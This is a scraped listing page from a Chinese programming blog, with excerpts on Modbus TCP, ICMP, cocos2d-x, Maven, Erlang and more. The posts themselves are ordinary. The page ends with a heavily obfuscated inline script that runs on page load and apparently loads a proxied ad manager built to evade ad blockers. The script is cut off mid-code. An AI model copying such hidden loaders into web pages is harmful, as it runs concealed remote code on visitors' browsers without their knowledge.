mAuthenticatorHelper.onAccountsUpdated(this, null); mDevelopmentPreferences = getSharedPreferences(DevelopmentSettings.PREF_FILE, Context.MODE_PRIVATE); getMetaData(); mInLocalHeaderSwitch = true; super.onCreate(savedInstanceState); mInLocalHeaderSwitch = false; if (!onIsHidingHeaders() &amp;&amp; onIsMultiPane()) { highlightHeader(mTopLevelHeaderId); // Force the title so that it doesn't get overridden by a direct launch of // a specific settings screen.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/66b6a4727897e53faf5669f65ab4ae79/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0e83f90021d5db71da702b0e7132e9a1/" rel="bookmark">
			MODBUS学习笔记——modbus tk modbus TCP主机实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		0.前言 modbus是一种古老但是高效的应用层协议。在嵌入式和PC机领域有多种方法实现modbus协议栈，modbus又分为从机和主机，从机和主机在协议栈的实现上存在不同。在不能运行linux的嵌入式系统中，freemodbus是一个完善的从机协议栈，在能够运行linux的嵌入式系统中存在多种选择，而modbus tk是使用python语言实现的modbus协议栈， 该函数库即支持主机也支持从机，即支持RTU也支持TCP。 有了modbus TK，那么在树莓派中加入一个modbus TCP实现从机功能，也就是分分钟的事情。 【有用的博客】 【1】 MODBUS协议整理——汇总 【2】 freemodbus modbus TCP 学习笔记 【3】 python 扩展库安装 使用第三方镜像源 1.modbus tk安装 【1】请确保安装python 2.5以上，并安装pyserial（使用python 控制串口） 【2】下载modbus tk安装包并解压。例如安装包解压至E:\modbus-tk-0.4.2 【3】打开控制台，进入E:\modbus-tk-0.4.2，输入: python setup.py install setup.py为文件名，install为运行该文件的参数。安装过程非常快。 【4】验证安装是否完成。import modbus_tk，若输入该命令python没有提示错误的话，那么表示modbus_tk安装成功。 图1 验证modbus tk安装成功 2.示例代码 请参考 freemodbus modbus TCP 学习笔记博文，建立一个modbus TCP从机。 从机IP地址 192.168.1.15 侦听端口 502 准备一些默认寄存器，共调试使用。 【输入寄存器】共16个，依次为1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 【保持寄存器】共16个，依次为16,15,14,13,12,11,10,9,8,7,6,5,4,3,2,1 【线圈寄存器】共16个，依次为0xFF,0x00 【离散输入寄存器】共16个，一次为0x00,0xFF 【 代码】 # -*- coding: utf_8 -*- import sys import logging import modbus_tk import modbus_tk.defines as cst import modbus_tk.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0e83f90021d5db71da702b0e7132e9a1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/17396ee15848e4e82ad9c6b4e5f17f81/" rel="bookmark">
			cocos2d-x3.0rc移植Android，程序异常退出，运行错误cannot find native library cocos2dcpp
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我是从3.0开始学习移植Android的，
看到官方文档的说法是，
直接点击~/proj.android/build_native.py进行编译
这是在没有添加新文件的情况下（如果这时都出错，请参考上一篇blog）
下面讲一下添加了文件之后怎么编译的问题：
首先，最好在命令行中执行脚本build_native.py，Python脚本是跨平台的，所以直接键入文件名就可以了
如果你没有改动Makefile
最后会提示你fail，请看最后的打印
啰嗦了，
关键在于要手动配置Makefile
在目录~/proj.android/jni下面，有一个android.mk文件
关注文件中的LOCAL_SRC_FILES项
删除你删除的cpp
以相同的格式添加你增加的cpp文件（.h文件会根据cpp文件自动链接，不需要添加）
ok
编译通过，运行正常
如果对你有帮助，请关注，谢谢
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c3ceed689f221cb87491d4a4cfbab2cc/" rel="bookmark">
			清除Visual Studio查找的历史记录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用Visual Studio大家会发现以前搜索的很多无用记录会遗留下来，时间长了，会产生很多无用记录。但是在Visual Studio中并没有提供清理的方法，下面删除的思路是从注册表着手的。
在进行下面操作之前，请确认你已经退出所有的Visual Studio，否则记录是无法删除的。
1.在运行中输入Regedit；
2.定位到如下的注册表项；
4.看到Find后面的字段了把，这些都是在搜索框中的搜索记录，下面你就可以自行选择删除了；
5.如果需要将替换的字段也删除掉那么可以将Replace相关的字段删除掉就可以了；
6.全部删除完毕以后，重启Visual Studio，清理完毕；
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f845d3a6e0af8bb26cccd3c49a094255/" rel="bookmark">
			ICMP报文分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		当要一台主机要发送一个IP数据报的时候会先检查自己网络接口的路由表，如果发现路由表中的目的地址没有和自己要发送的IP数据包的目的地址相匹配的（包括网络地址也不匹配）也没有默认网关（默认路由地址）则该主机会对发送给数据包的应用程序返回一个错误！ 如果该IP数据报是在被转发的过程中即是在路由器的接口的路由表中没有找到匹配地址，则该路由器会给原始发送端一个ICMP主机不可达的差错报文。 一.概述： 1. ICMP允许主机或路由报告差错情况和提供有关异常情况。ICMP是因特网的标准协议，但ICMP不是高层协议，而是IP层的协议。通常ICMP报文被IP层或更高层协议（TCP或UDP）使用。一些ICMP报文把差错报文返回给用户进程。
2. ICMP报文作为IP层数据报的数据，加上数据报的首部，组成数据报发送出去。
3. ICMP报文的种类有两种，即ICMP差错报告报文和ICMP询问报文。
二.ICMP报文的格式 1. 类型：占8位
2. 代码：占8位
3. 检验和：占16位
说明：ICMP所有报文的前4个字节都是一样的，但是剩下的其他字节则互不相同。
4. 其它字段都ICMP报文类型不同而不同。
1&gt; ICMP报文的前4个字节是统一的格式，共有三个字段：即类型，代码和检验和。
2&gt; 8位类型和8位代码字段一起决定了ICMP报文的类型。
类型8，代码0：表示回显请求(ping请求)。
类型0，代码0：表示回显应答(ping应答)
类型11，代码0：超时
3&gt;16位的检验和字段：包括数据在内的整个ICMP数据包的检验和；其计算方法和IP头部检验和的计算方法一样的。
ICMP报文具体分为查询报文和差错报文(对ICMP差错报文有时需要做特殊处理，因此要对其进行区分。如：对ICMP差错报文进行响应时，永远不会生成另一份ICMP差错报文，否则会出现死循环)
三.ICMP差错报文(56字节) IP层的差错控制有4个特点：
①IP层解决的主要是信宿不可达的问题，由于信宿机本身不可达，使得信宿机无法直接参与控制，所以要想通过端到端的方式来解决不太现实；
②IP层仅仅涉及与路径和可达相关的差错问题，而不解决数据本身的差错问题；
③IP层的差错与控制有一个独立的协议ICMP完成，IP协议不负责完成差错与控制功能。
④控制是建立在对信息了解的基础上的，在ICMP中控制方可以通过主动与被动两种方式了解信息：主动方式向对象发出询问，被动方式则是被动接收对象所报告的信息。
ICMP协议设计的最初目的主要是用于IP层的差错报告，由路由器或信宿机以一对一的模式向信源机报告发生传输错误的原因。ICMP与IP协议位于同一个层次（IP层），但ICMP报文是封装在IP数据报的数据部分进行传输的。它并不作为一个独立的层次，而只是作为IP层的一部分。ICMP协议是对IP协议的补充。用于IP层的差错报告、拥塞控制、路径控制以及路由器或主机信息获取。
1. ICMP差错报告报文共有5种
1&gt; 终点不可达：终点不可达分为:网络不可达，主机不可达，协议不可达，端口不可达，需要分片但DF比特已置为1，以及源路由失败等六种情况，其代码字段分别置为0至5。当出现以上六种情况时就向源站发送终点不可达报文。
说明：
端口不可达：UDP的规则之一是：如果收到UDP数据报而且目的端口与某个正在使用的进程不相符，那么UDP返回一个ICMP不可达报文。
2&gt; 源站抑制：当路由器或主机由于拥塞而丢弃数据报时，就向源站发送源站抑制报文，使源站知道应当将数据报的发送速率放慢。
3&gt; 时间超过：当路由器收到生存时间为零的数据报时，除丢弃该数据报外，还要向源站发送时间超过报文。当目的站在预先规定的时间内不能收到一个数据报的全部数据报片时，就将已收到的数据报片都丢弃，并向源站发送时间超过报文。
4&gt; 参数问题：当路由器或目的主机收到的数据报的首部中的字段的值不正确时，就丢弃该数据报，并向源站发送参数问题报文。
5&gt; 改变路由（重定向）路由器将改变路由报文发送给主机，让主机知道下次应将数据报发送给另外的路由器。
说明:
以下几种情况都不会导致产生ICMP差错报文
1&gt;ICMP差错报文（但是，ICMP查询报文可能会产生ICMP差错报文）
2&gt;目的地址是广播地址或多播地址的IP数据报
3&gt;作为链路层广播的数据报
4&gt;不是IP分片的第一片
5&gt;源地址不是单个主机的数据报。即源地址不能为零地址、环回地址、广播地址或多播地址。
这些规则是为了防止过去允许ICMP差错报文对广播分组响应所带来的广播风暴。
2.所有的ICMP差错报告报文中的数据字段都具有同样的格式。将收到的需要进行差错报告IP数据报的首部和数据字段的前8个字节提取出来，作为ICMP报文的数据字段。再加上响应的ICMP差错报告报文的前8个字节，就构成了ICMP差错报告报文。提取收到的数据报的数据字段的前8个字节是为了得到运输层的端口号（对于TCP和UDP）以及运输层报文的发送序号（对于TCP）。
注：以上的两个IP数据包的首部不是同一个。上面的那个是发生错误的IP数据包首部 注：一下情况不发送ICMP差错报告报文
三.ICMP询问报文（40字节） 1.ICMP询问报文有四种回送请求和回答，时间戳请求和回答，掩码地址请求和回答，以及路由器询问和通过。
1&gt;ICMP回送请求报文是由主机或路由器向一个特定的目的主机发出的询问。收到此报文的机器必须给源主机发送ICMP回送应答报文。这种询问报文用来测试目的站是否可达以及了解其有关状态。
2&gt;ICMP时间戳请求允许系统向另一个系统查询当前的时间。该ICMP报文的好处是它提供了毫秒级的分辨率，而利用其他方法从别的主机获取的时间只能提供秒级的分辨率。请求端填写发起时间，然后发送报文。应答系统收到请求报文时填写接收时间戳，在发送应答时填写发送时间戳。大多数的实现是把后面两个字段都设成相同的值。
3&gt;主机使用ICMP地址掩码请求报文可向子网掩码服务器得到某个接口的地址掩码。系统广播它的ICMP请求报文。ICMP报文中的标识符和序列号字段由发送端任意选择设定，这些值在应答中将被返回，这样，发送端就可以把应答与请求进行匹配。
4&gt;主机使用ICMP路由器询问和通过报文可了解连接在本网络上的路由器是否正常工作。主机将路由器询问报文进行广播（或多播）。收到询问报文的一个或几个路由器就使用路由器通过报文广播其路由选择信息
四.Ping程序 1.概述
1&gt;Ping程序是为了测试另一台主机是否可达。该程序发送一份ICMP回显请求报文给主机，并等待返回ICMP回显应答。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f845d3a6e0af8bb26cccd3c49a094255/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b7bd4759a8dc7fee07820e6f8123e728/" rel="bookmark">
			Tomcat中应用日志中文乱码解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题 在tomcat中有时输出的日志中文为乱码，包括控制台窗口和输出日志文件中都为乱码。
解决方案 JDK引用的设置
Java引用参数添加"-Dfile.encoding=UTF8 -Dsun.jnu.encoding=UTF8"
将上面参数添加到Catalina.sh中JAVA_OPTS变量中，重启Tomcat，OK了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e271ac5d774a38322539af1ae5a58085/" rel="bookmark">
			复制与粘贴
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Problem 101: 剪切与粘贴 Time Limit:1 Ms| Memory Limit:128 MB Difficulty:2 Description 我们用文本处理器来处理一个特殊的文本文件，该文本文件共有N行文本，每一行文本仅包含一个自然数，第一行为1、第二行为2，以此类推至N行为自然数N。 假设对该文本文件执行一次“剪切和粘贴”操作含义如下：首先选定连续的若干行文本，“剪切”操作将选定的文本从文件中剪下，而“粘贴”操作将剪切下来的文本插入到文件中的其他地方。 编写一个程序求出在进行了连续若干次“剪切和粘贴”操作后，文本文件中前十行的内容。 Input 输入文件的第一行包含两个用空格隔开的自然数N和K，N表示文件的总行数(10≤N≤100,000)，K表示“剪切和粘贴”的总次数(1≤k≤1000)。 下面K行每一行包含一次“剪切和粘贴”操作的执行信息，每行包含三个用空格隔开自然数A，B和C，其中1≤A≤B≤N，0≤C≤N-(B-A+1)。A和B表示选定文本的第一行和最后一行，C表示被剪切下来的文本待插入处的前一行，如果C等于0则被剪切下来的的文本将被插入到文件的开头。 Output 输出文件，将由十行组成，其中包含所有的操作都完成后的文本文件中前十行所包含的数字。 Sample Input 13 3 6 12 1 2 9 0 10 13 8 Sample Output 6 7 8 9 10 11 12 2 3 4 代码：
#include&lt;stdio.h&gt; #include&lt;stdlib.h&gt; typedef struct node { int d; struct node *next; }Node; Node *head = NULL, *pre, *below;//pre指向是剪切开始的位置，below指向剪切结束的位置; int n, num; void create(Node **head)//建立链表; { int i; Node *p,*tail; for(i = 1; i &lt;= n; i++) { p = (Node *)malloc(sizeof(Node)); p-&gt;d = i; p-&gt;next = NULL; if(*head == NULL) { (*head) = (Node *)malloc(sizeof(Node)); (*head)-&gt;next = p; tail = p; } else { tail-&gt;next = p; tail = p; } } } int main() { int i,j,pnum, a1, a2, a3, k; Node *p, *tail, *in, *prever;//prever指向pre的前一个位置; scanf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e271ac5d774a38322539af1ae5a58085/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0e473f3b3a4e62601db689505735cec3/" rel="bookmark">
			Android - Intent广播(broadcast)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Intent广播(broadcast) 本文地址: http://blog.csdn.net/caroline_wendy/article/details/21590339
Intent可以使用sendBroadcast(), 在应用组件之间广播事件;
使用BroadReceiver类监听和响应Broadcast Intent, 需要注册(register)和过滤器(intent-filter);
1. 创建Broadcast Intent 构建需要广播的Intent, 包含Intent标识字符串, 和数据(data, extras), 使用sendBroadcast()发送;
Intent标识字符串, 可以标识要广播的字符串, 应该是能够标志的唯一字符串,
public static final String [ACTION_STRING] = "[mzx].[clwang].action.[ACTION_STRING]";
Intent包含数据, 进行广播, 可以使用data属性指定一个URI, 可以在extras添加额外的基本值;
Intent intent = new Intent("[mzx].[clwang].action.[ACTION_STRING");
sendBroadcast(intent);
2. 接收Broadcast Intent 使用Broadcast Receiver来监听Broadcast Intent, 在代码或manifest中注册, 使用Intent FIlter表明监听的Intent(标识符)和数据;
应用程序可以被Intent启动, 可以创建事件驱动的应用程序;
Broadcast Receiver, 继承BroadcastReceiver类, 重写onReceive事件, 进行处理, 必须在5秒之内完成;
代码注册:
注册BroadcastReceiver, 需要使用IntentFilter, 指明标识符; 使用BroadReceiver类, 指明接收器;
注册: registerReceiver(receiver, filter); 注销:unregisterReceiver(receiver);
Manifest注册:
&lt;receiver android:name = ".[Receiver]"&gt;
&lt;intent-filter&gt;
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0e473f3b3a4e62601db689505735cec3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ea80a745c4e89fa07b49cc1c81f6043a/" rel="bookmark">
			cocos2d-x3.0rc第一次移植闪退的处理办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		按照官方教程移植，到真机上运行会出现闪退的情况。
解决办法是：
拷贝~\cocos2d-x-3.0rc0\cocos\2d\platform\android\java\src\org\cocos2dx目录下的lib目录到文件夹
~\cocos2d-x-3.0rc0\projects\CelsunGame\proj.android\src\org\cocos2dx下
重新运行build_native.py编译项目
运行，ok
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2089ebda4a11090d534da4b0f170da21/" rel="bookmark">
			二分查找算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 定义 折半查找算法也称二分查找算法或折半搜索算法，是一种在有序数组（即前提必须是数组是已经排好序的）中查找某一特定元素的搜索算法。搜素过程是
1）计算中间元素mid
从数组的中间元素开始，如果中间元素正好是要查找的元素，则搜素过程结束；
2）比较左边元素left, 比较右边元素right
如果某一特定元素大于或者小于中间元素，则在数组大于或小于中间元素的那一半中查找，而且跟开始一样从中间元素开始比较。如果在某一步骤数组为空，则代表找不到。
这种搜索算法每一次比较都使搜索范围缩小一半。如下图，lowerBound代表查找起始范围，upperBound代表查找终止位置，mid是中间元素。我们需要考虑的是算法何时结束？
2 java代码实现 我们定义如下的一个函数来实现二分查找
[java] view plain copy / * @param a 待查找的数组 * @param fromIndex 查找的起始位置 * @param toIndex 查找的终止位置是（toIndex-1） * @param key 要查找的数据 * @return 查找数据在数组中的位置 * 如果查找的数据不存在，则返回 - 1 * insertion point是查找数据如果插入数组时它插入的位置 */ public static int search(int[] a,int fromIndex,int toIndex,int key){ //add your code here } 1) 代码第一次实现如下 观察上述代码，你能发现几个问题呢？
1）输入控制
如果数组为null，那么a[i]势必会抛出异常；
如果输入的fromIndex&gt;toIndex，函数本身就没有意义；而且fromIndex和toIndex如果不在数组长度范围(0~length-1)内怎么办?
上述可能出现的异常，都源于没有对输入参数做控制处理。
[java] view plain copy //input control if(a==null) //if a is null return -1; if(fromIndex&lt;0 || toIndex&gt;a.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2089ebda4a11090d534da4b0f170da21/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c3114cbd119c1ac0cfca58e99d733d06/" rel="bookmark">
			eclipse安装WindowBuilder 插件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Eclipse4.2安装图形化界面WindowBuilder WindowBuilder是可视化Java GUI编程的eclipse 插件。有了它的帮助，我们可以通过拖拽来编辑Java程序界面。安装过程如下： 1.下载WindowBuilder http://eclipse.org/windowbuilder/download.php 在上面网站选择与自己eclipse版本相符的WindowBuilder. 如下图所示：
eclipse版本查看方法：打开eclipse安装路径-》打开 .eclipseproduct,里面就有版本号。
我安装的是eclipse4.2所以下载红笔所示的版本。下载后的.zip文件如下： WB_v1.5.1_UpdateSite_for_Eclipse4.2.zip
2.安装WindowBuilder 1）把.zip文件拷贝到eclipse安装目录下plugins文件夹里。注意：是把整个zip文件，不需要解压。
2）打开eclipse -- Help -- Install New Software... -- Add... -- Archive... 在弹出的对话框中选择之前放进plugins文件夹的zip文件，Open
然后点OK，会看到
选择Select All, 然后点击Next. 之后一路点下去就好了，会有一个安装过程，安装完后弹出一个对话款提示重新启动eclipse。
三、安装成功后查看插件情况
重新启动eclipse后，在 Window -- Preferences 看到下面情况，说明安装成功。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b0bd3c57327dc089c3a490739a3ac5dd/" rel="bookmark">
			Maven：Non-resolvable parent POM: Failure to find错误
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用Maven编译淘宝的TimeTunnel项目时遇到如下错误：
[INFO] Scanning for projects...
[ERROR] The build could not read 1 project -&gt; [Help 1]
[ERROR]
[ERROR] The project com.taobao:timetunnel-client:0.2.0-SNAPSHOT (E:\MyWork\TimeTunnel\time
lient\java\pom.xml) has 1 error
[ERROR] Non-resolvable parent POM: Failure to find com.taobao:timetunnel:pom:0.2.0-SNAPS
ttp://192.168.169.48:6677/nexus/content/groups/public/ was cached in the local repository, r
n will not be reattempted until the update interval of nexus has elapsed or updates are forc
parent.relativePath' points at wrong local POM @ line 4, column 10 -&gt; [Help 2]
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b0bd3c57327dc089c3a490739a3ac5dd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cbdf38e98b391de52b84c231b8587aea/" rel="bookmark">
			初学cocos2dx lua
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最基本的层
function createInGameLayer() local inGameLayer = cc.Layer:create() return inGameLayer end 最基本的场景
local sceneGame = cc.Scene:create() sceneGame:addChild(createInGameLayer()) cc.Director:getInstance():runWithScene(sceneGame) cc.Director:getInstance():replaceScene(cc.TransitionFade:create(1,WelcomeScene.createScene())) 最基本的精灵
function createInGameLayer() local inGameLayer = cc.Layer:create() local bg = cc.Sprite:create("farm.jpg") bg:setAnchorPoint(0,0) inGameLayer:addChild(bg) return inGameLayer end 最基本的定时器 local function tick() end cc.Director:getInstance():getScheduler():scheduleScriptFunc(tick, 0, false) 最基本的触摸事件
local touchBeginPoint = nil local function onTouchBegan(touch, event) local location = touch:getLocation() cclog("onTouchBegan: %0.2f, %0.2f", location.x, location.y) touchBeginPoint = {x = location.x, y = location.y} -- CCTOUCHBEGAN event must return true --[[多点 for i = 1,table.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cbdf38e98b391de52b84c231b8587aea/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a70a03ec6275af47f4ad4f415c060f8b/" rel="bookmark">
			PowerDesigner生成mysql字段comment 注释
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		PowerDesigner生成mysql字段comment 注释
最近需求出了新变化，再次开始 pd 之路，却发现很多以前熟练的操作俨然陌生，
好记性不如烂笔头一点不假。
1. 为什么没有注释
在 pdm 视图中，默认 powerdesigner 是不会生成注释的。
2. 解决方案
可以修改 mysql 文件生成模版来达到我们所需要的效果。
3. 生成注释
在 pdm 视图中，Database --&gt; Edit Current DBMS。
找到 MySql5.0 --&gt; Script --&gt; Objects --&gt; Column --&gt; Add。
a） 原来的内容
%20:COLUMN% [%National%?national ]%DATATYPE%[%Unsigned%? unsigned][%ZeroFill%? zerofill][ [.O:[character set][charset]] %CharSet%][.Z:[ %NOTNULL%][%IDENTITY%? auto_increment:[ default %DEFAULT%]][ comment %.q:@OBJTLABL %]] b） 修改后的内容
%20:COLUMN% [%National%?national ]%DATATYPE%[%Unsigned%? unsigned][%ZeroFill%? zerofill][ [.O:[character set][charset]] %CharSet%][.Z:[ %NOTNULL%][%IDENTITY%? auto_increment:[ default %DEFAULT%]][ comment %.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a70a03ec6275af47f4ad4f415c060f8b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/807f3373aa015dadc9680222b8244052/" rel="bookmark">
			Sparse Autoencoder
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		网址：http://deeplearning.stanford.edu/wiki/index.php/UFLDL教程
代码阅读：matlab基础
（1）repmat函数：这是一个处理大矩阵且内容有重复时使用，举例如下：
&gt;B=repmat( [1 2;3 4],2,3)
B = 1 2 1 2 1 2
3 4 3 4 3 4
1 2 1 2 1 2
3 4 3 4 3 4
(2)reshape函数：reshape（X,M,N)；比如X=[1 2 3;4 5 6],Y=reshape(X,3,2)。注意X与Y的元素个数相同。在Matlab中，矩阵元素下标是按列来计算的。
（3）imresize:改变图像大小的函数，如彩色图像，X:256*256*3，应用Y=imresize(X,[8 8])，则Y为8*8*3的彩色图像，且大体形状不变。
有关疑问
1、教程中输出层神经元使用的激励函数是sigmoid函数，此函数的输出范围是:(0,1)，我看了输入的IMAGES图像，很明显数据里面有负值。如此输出怎么能够重构输入呢？
2、为什么用线性解码器提取彩色图像？因为转化double类型的彩色图像，矩阵里面有1，为了更好的重构输入，即更加说明隐含层的特征是输入的，所以运用线性解码器？是这样吗？？？
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8761ebc3262b9776d2975eaa35f7ee02/" rel="bookmark">
			简单erlang节点互连实验
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 如果erlang:节点test1,test2互连接： 1.节点test1，test2 启动：分别在不同的shell上运行： erl -name test1 -setcookie "erlang_code_fun"
erl -name test2 -setcookie "erlang_code_fun" 2.在节点1，节点2上运行： node()得到自己节点的名称。 观察与之互接的节点： nodes(). 节点test1:信息 [img]http://dl2.iteye.com/upload/attachment/0094/6734/ce8fbfaa-a31a-3af9-b69a-c2999ae6f42e.png[/img] 节点test2:信息 [img]http://dl2.iteye.com/upload/attachment/0094/6736/7d5959ca-f9ff-3135-a128-502178a789bd.png[/img] 3.把test1,test2节点连接起来： 可以看到双方的nodes()都返回了对方的节点名。 [img]http://dl2.iteye.com/upload/attachment/0094/6738/a35b0e9d-5352-3814-ac08-c4eb0cf68bc3.png[/img] 4. 起test3节点： erl -name test3 -setcookie "erlang_code_fun" 然后test3连接test2: [img]http://dl2.iteye.com/upload/attachment/0094/6740/cb4437ea-1596-3758-b6bf-ff64b4defc05.png[/img] 可以看到test3也和test1互接了！ 在test1看nodes(). 结论：如果A,B节点互连，用C节点连接B节点，则这3个节点都是互连的。 PPS:要cookie一致哦，如果不一致可用set_cookie/1来设置，不过只能连接到指定的节点上，不能连接到与指定节点相连且与之不一样的cookie上哦。 
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/561/">«</a>
	<span class="pagination__item pagination__item--current">562/578</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/563/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var 